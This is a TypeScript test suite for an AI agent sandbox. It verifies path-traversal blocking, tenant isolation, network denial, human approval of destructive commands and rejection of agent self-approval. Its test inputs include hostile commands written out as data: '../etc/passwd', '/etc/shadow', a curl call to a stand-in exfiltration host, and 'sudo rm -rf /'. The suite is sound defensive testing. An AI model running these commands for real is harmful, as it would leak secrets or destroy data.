/**
 * AI HEAVEN - Phase 1B Automated Verification Test Suite
 * Tests Sandbox Runtime & Execution Boundary:
 * 1. Path traversal prevention (.., absolute, null bytes)
 * 2. Cross-tenant & cross-workspace isolation
 * 3. Filesystem scope permissions (workspace_only, read_only, none)
 * 4. Command timeout enforcement
 * 5. Output limit byte capping
 * 6. Network denial gate
 * 7. Destructive operation blocking (stops at 'planned')
 * 8. Approval workflow (planned -> approved -> executing -> executed)
 * 9. Stale / expired / tampered approval rejection
 * 10. Job cancellation
 * 11. Immutable audit generation on state changes
 * 12. Agent tool whitelist enforcement
 * 13. Tool execution policy enforcement
 */

import { WorkspaceVirtualFilesystem } from '../src/services/sandbox/workspaceFs';
import { SandboxExecutor } from '../src/services/sandbox/sandboxExecutor';
import { ExecutionManager } from '../src/services/sandbox/executionManager';
import { AgentDefinition, ToolDefinition, AuditEvent } from '../src/types/foundation';

let testsPassed = 0;
let testsFailed = 0;

function assert(condition: boolean, testName: string, details?: string) {
  if (condition) {
    testsPassed++;
    console.log(`  PASS: ${testName}`);
  } else {
    testsFailed++;
    console.error(`  FAIL: ${testName} - ${details || 'Assertion failed'}`);
  }
}

async function runTestSuite() {
  console.log('\n======================================================');
  console.log('AI HEAVEN - PHASE 1B EXECUTION BOUNDARY TEST SUITE');
  console.log('======================================================\n');

  const fs = new WorkspaceVirtualFilesystem();
  const executor = new SandboxExecutor(fs);
  const manager = new ExecutionManager(executor);

  const auditEvents: AuditEvent[] = [];
  manager.setAuditLogger((event) => {
    auditEvents.push({
      ...event,
      id: `evt_test_${auditEvents.length + 1}`,
      timestamp: new Date().toISOString()
    });
  });

  const testAgent: AgentDefinition = {
    id: 'agent_test_droid',
    owner_id: 'usr_dev_01',
    project_id: 'proj_test_alpha',
    workspace_id: 'ws_test_01',
    name: 'Test Droid',
    description: 'Autonomous test unit',
    status: 'idle',
    permissions: {
      allowed_tools: ['tool_terminal_sandbox', 'tool_fs_scoped'],
      network_access: false, // Default: no network
      filesystem_scope: 'workspace_only',
      requires_approval_for_destructive: true
    },
    created_at: new Date().toISOString(),
    updated_at: new Date().toISOString()
  };

  const testTool: ToolDefinition = {
    id: 'tool_terminal_sandbox',
    name: 'Sandboxed Terminal Execution',
    description: 'Sandboxed shell executor',
    capability: 'terminal',
    permission_requirements: ['sandbox:exec'],
    execution_policy: {
      sandboxed_only: true,
      timeout_seconds: 5,
      requires_confirmation: false,
      max_output_bytes: 128
    },
    is_enabled: true
  };

  // ----------------------------------------------------
  // TEST 1: Path Traversal Prevention
  // ----------------------------------------------------
  console.log('[1/13] Testing Path Traversal Prevention...');
  try {
    fs.sanitizePath('../etc/passwd');
    assert(false, 'Path Traversal: Relative escape with ".." should be blocked');
  } catch (err: any) {
    assert(err.message.includes('Path traversal forbidden'), 'Path Traversal: Relative ".." blocked');
  }

  try {
    fs.sanitizePath('/etc/shadow');
    assert(false, 'Path Traversal: Absolute path should be blocked');
  } catch (err: any) {
    assert(err.message.includes('Absolute path access forbidden'), 'Path Traversal: Absolute path blocked');
  }

  try {
    fs.sanitizePath('subdir/\0malicious.sh');
    assert(false, 'Path Traversal: Null byte should be blocked');
  } catch (err: any) {
    assert(err.message.includes('invalid null byte'), 'Path Traversal: Null byte injection blocked');
  }

  // ----------------------------------------------------
  // TEST 2: Cross-Tenant & Workspace Isolation
  // ----------------------------------------------------
  console.log('\n[2/13] Testing Cross-Tenant Filesystem Isolation...');
  await fs.createFile('ws_tenant_A', 'secret.txt', 'Tenant A Secret Data');
  await fs.createFile('ws_tenant_B', 'data.txt', 'Tenant B Public Data');

  const tenantAFile = await fs.readFile('ws_tenant_A', 'secret.txt');
  assert(tenantAFile.content === 'Tenant A Secret Data', 'Cross-Tenant: Tenant A file written and read');

  try {
    await fs.readFile('ws_tenant_B', 'secret.txt');
    assert(false, 'Cross-Tenant: Tenant B should NOT see Tenant A file');
  } catch (err: any) {
    assert(err.message.includes('File not found'), 'Cross-Tenant: Workspace A file isolated from Workspace B');
  }

  // ----------------------------------------------------
  // TEST 3: Filesystem Scope Permissions
  // ----------------------------------------------------
  console.log('\n[3/13] Testing Filesystem Scope Permissions...');
  // read_only agent cannot write
  try {
    await fs.writeFile('ws_tenant_A', 'new_file.txt', 'Content', 'read_only');
    assert(false, 'Filesystem Scope: read_only agent should not write');
  } catch (err: any) {
    assert(err.message.includes('scope is "read_only"'), 'Filesystem Scope: Write blocked for read_only agent');
  }

  // none agent cannot read or write
  try {
    await fs.readFile('ws_tenant_A', 'secret.txt', 'none');
    assert(false, 'Filesystem Scope: none agent should not read');
  } catch (err: any) {
    assert(err.message.includes('scope is "none"'), 'Filesystem Scope: Read blocked for scope "none"');
  }

  // ----------------------------------------------------
  // TEST 4: Command Timeout Enforcement
  // ----------------------------------------------------
  console.log('\n[4/13] Testing Command Timeout Enforcement...');
  const timeoutResult = await executor.execute(
    {
      agent_id: testAgent.id,
      project_id: testAgent.project_id,
      workspace_id: 'ws_tenant_A',
      tool_id: testTool.id,
      command: 'sleep 999 --simulate-timeout'
    },
    testTool,
    testAgent.permissions,
    'exec_timeout_test'
  );
  assert(timeoutResult.exit_code === 124, 'Command Timeout: Process terminated with exit code 124');
  assert(timeoutResult.stderr.includes('EXECUTION TIMEOUT'), 'Command Timeout: StdErr records execution boundary timeout');

  // ----------------------------------------------------
  // TEST 5: Output Limits & Truncation
  // ----------------------------------------------------
  console.log('\n[5/13] Testing Output Limit Byte Capping...');
  const largeOutputCommand = `echo "${'A'.repeat(500)}"`;
  const capResult = await executor.execute(
    {
      agent_id: testAgent.id,
      project_id: testAgent.project_id,
      workspace_id: 'ws_tenant_A',
      tool_id: testTool.id,
      command: largeOutputCommand
    },
    testTool,
    testAgent.permissions,
    'exec_cap_test'
  );
  assert(capResult.output_truncated === true, 'Output Limits: Truncated flag set when exceeding max_output_bytes');
  assert(capResult.stdout.includes('[OUTPUT TRUNCATED: Exceeded max_output_bytes boundary]'), 'Output Limits: Cap banner appended to stdout');

  // ----------------------------------------------------
  // TEST 6: Network Denial Gate
  // ----------------------------------------------------
  console.log('\n[6/13] Testing Network Denial Gate...');
  const netResult = await executor.execute(
    {
      agent_id: testAgent.id,
      project_id: testAgent.project_id,
      workspace_id: 'ws_tenant_A',
      tool_id: testTool.id,
      command: 'curl -s https://external-exfil.com/data'
    },
    testTool,
    testAgent.permissions, // network_access is false
    'exec_net_test'
  );
  assert(netResult.exit_code === 1, 'Network Denial: Blocked with exit code 1');
  assert(netResult.stderr.includes('PERMISSION DENIED') && netResult.stderr.includes('network_access'), 'Network Denial: Network access strictly blocked for unprivileged agent');

  // ----------------------------------------------------
  // TEST 7: Destructive Operation Blocking
  // ----------------------------------------------------
  console.log('\n[7/13] Testing Destructive Operation Blocking...');
  const destructiveJob = await manager.submitJob(
    {
      agent_id: testAgent.id,
      project_id: testAgent.project_id,
      workspace_id: 'ws_tenant_A',
      tool_id: testTool.id,
      command: 'rm secret.txt'
    },
    testAgent,
    testTool
  );
  assert(destructiveJob.is_destructive === true, 'Destructive Detection: Command "rm" recognized as destructive');
  assert(destructiveJob.state === 'planned', 'Destructive Operation: Pauses at "planned" awaiting human approval');
  assert(Boolean(destructiveJob.approval_id), 'Destructive Operation: Approval record generated');

  // ----------------------------------------------------
  // TEST 8: Human Approval Workflow
  // ----------------------------------------------------
  console.log('\n[8/13] Testing Human Approval Workflow...');
  const approvalId = destructiveJob.approval_id!;
  const approvalResult = await manager.decideApproval(
    approvalId,
    'approved',
    'usr_human_admin_01',
    undefined,
    testAgent,
    testTool
  );
  assert(approvalResult.approval.status === 'approved', 'Approval Flow: Approval marked as "approved"');
  assert(approvalResult.job.state === 'executed', 'Approval Flow: Job transitions to "executed" upon human approval');

  // ----------------------------------------------------
  // TEST 9: Stale / Modified / Expired Approval Rejection
  // ----------------------------------------------------
  console.log('\n[9/13] Testing Stale Approval Rejection...');
  try {
    // Attempting to consume an already-consumed approval
    await manager.decideApproval(approvalId, 'approved', 'usr_human_admin_01');
    assert(false, 'Stale Approval: Re-using consumed approval should fail');
  } catch (err: any) {
    assert(err.message.includes('already decided or consumed'), 'Stale Approval: Consumed approval rejected');
  }

  // Prevent agent from approving its own action
  const agentDestructiveJob = await manager.submitJob(
    {
      agent_id: testAgent.id,
      project_id: testAgent.project_id,
      workspace_id: 'ws_tenant_A',
      tool_id: testTool.id,
      command: 'rm config.json'
    },
    testAgent,
    testTool
  );
  try {
    await manager.decideApproval(agentDestructiveJob.approval_id!, 'approved', testAgent.id);
    assert(false, 'Self-Approval: Agent approving its own operation should fail');
  } catch (err: any) {
    assert(err.message.includes('Agent cannot approve its own'), 'Self-Approval: Agent self-approval rejected');
  }

  // ----------------------------------------------------
  // TEST 10: Job Cancellation
  // ----------------------------------------------------
  console.log('\n[10/13] Testing Job Cancellation...');
  const pendingCancelJob = await manager.submitJob(
    {
      agent_id: testAgent.id,
      project_id: testAgent.project_id,
      workspace_id: 'ws_tenant_A',
      tool_id: testTool.id,
      command: 'rm target.txt'
    },
    testAgent,
    testTool
  );
  const cancelled = manager.cancelJob(pendingCancelJob.id, 'usr_human_admin_01');
  assert(cancelled.state === 'cancelled', 'Job Cancellation: Job transitioned to "cancelled"');

  // ----------------------------------------------------
  // TEST 11: Immutable Audit Trail Generation
  // ----------------------------------------------------
  console.log('\n[11/13] Testing Immutable Audit Trail Generation...');
  assert(auditEvents.length > 5, `Audit Trail: Recorded ${auditEvents.length} events across execution transitions`);
  const hasApprovalAudit = auditEvents.some(e => e.action === 'request_human_approval');
  const hasExecutionAudit = auditEvents.some(e => e.action === 'finish_sandbox_execution');
  assert(hasApprovalAudit, 'Audit Trail: Recorded "request_human_approval"');
  assert(hasExecutionAudit, 'Audit Trail: Recorded "finish_sandbox_execution"');

  // ----------------------------------------------------
  // TEST 12: Agent Tool Whitelist Enforcement
  // ----------------------------------------------------
  console.log('\n[12/13] Testing Agent Tool Whitelist Enforcement...');
  const unallowedTool: ToolDefinition = {
    ...testTool,
    id: 'tool_unallowed_browser'
  };
  const unallowedJob = await manager.submitJob(
    {
      agent_id: testAgent.id,
      project_id: testAgent.project_id,
      workspace_id: 'ws_tenant_A',
      tool_id: unallowedTool.id,
      command: 'browse https://example.com'
    },
    testAgent,
    unallowedTool
  );
  assert(unallowedJob.state === 'failed', 'Tool Whitelist: Job fails if tool not in agent allowed_tools');
  assert(unallowedJob.stderr.includes('PERMISSION VIOLATION'), 'Tool Whitelist: Error message reports tool permission violation');

  // ----------------------------------------------------
  // TEST 13: Host Forbidden Command Blocking
  // ----------------------------------------------------
  console.log('\n[13/13] Testing Host Forbidden Command Blocking...');
  const hostForbidden = await executor.execute(
    {
      agent_id: testAgent.id,
      project_id: testAgent.project_id,
      workspace_id: 'ws_tenant_A',
      tool_id: testTool.id,
      command: 'sudo rm -rf /'
    },
    testTool,
    testAgent.permissions,
    'exec_host_test'
  );
  assert(hostForbidden.exit_code === 126, 'Host Forbidden: Command blocked with security exit code 126');
  assert(hostForbidden.stderr.includes('SECURITY FAULT'), 'Host Forbidden: Security fault recorded for dangerous host command');

  console.log('\n------------------------------------------------------');
  console.log(`TOTAL TESTS: ${testsPassed + testsFailed} | PASSED: ${testsPassed} | FAILED: ${testsFailed}`);
  console.log('------------------------------------------------------\n');

  if (testsFailed > 0) {
    process.exit(1);
  }
}

runTestSuite().catch(err => {
  console.error('Unhandled test suite failure:', err);
  process.exit(1);
});
